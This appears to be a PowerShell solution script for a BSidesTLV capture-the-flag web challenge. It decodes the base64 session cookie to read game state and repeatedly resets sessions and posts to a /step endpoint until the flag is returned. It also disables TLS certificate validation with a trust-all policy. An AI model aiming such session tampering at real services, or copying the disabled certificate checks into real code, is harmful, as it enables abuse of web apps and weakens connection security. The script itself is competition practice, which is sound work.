add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@

function Base64Decode($Encoded)
{
$Length = $Encoded.Length
$RandomChar = 1..($Length - 3) | Get-Random
$Encoded = $Encoded.Insert($RandomChar,'=')

# strip out '='
$Stripped = $Encoded.Replace('=','')  

# append appropriate padding
$ModulusValue = ($Stripped.length % 4)   
    Switch ($ModulusValue) {
        '0' {$Padded = $Stripped}
        '1' {$Padded = $Stripped.Substring(0,$Stripped.Length - 1)}
        '2' {$Padded = $Stripped + ('=' * (4 - $ModulusValue))}
        '3' {$Padded = $Stripped + ('=' * (4 - $ModulusValue))}
    }
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Padded))
}


[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$WebReq = Invoke-WebRequest -UseBasicParsing -Uri "https://roll-the-impossible.ctf.bsidestlv.com/" -SessionVariable 'Session' 
$myCookie = Base64Decode -Encoded (($session.Cookies.GetCookies('https://roll-the-impossible.ctf.bsidestlv.com/').value).split(".")[0])

do {
$WebReq = (Invoke-WebRequest -UseBasicParsing -Uri "https://roll-the-impossible.ctf.bsidestlv.com/step" `
-Method "POST" -WebSession $Session -ContentType "application/json" -Body "{}").Content  | ConvertFrom-Json
#Write-Host "Cookie $myCookie" 
if (($WebReq.flag.Length -eq 8) -or !($myCookie -match '.*fish.*')) { 
    #Write-Host "Cleared $myCookie Length: " ($WebReq.flag.Length)
    Clear-Variable  Session 
    $WebReq = Invoke-WebRequest -UseBasicParsing -Uri "https://roll-the-impossible.ctf.bsidestlv.com/" -SessionVariable 'Session' 
    $myCookie = Base64Decode -Encoded (($session.Cookies.GetCookies('https://roll-the-impossible.ctf.bsidestlv.com/').value).split(".")[0])
    } #else { ($myCookie) }
} while ($WebReq.flag.Length -lt 9)

clear
$WebReq.flag
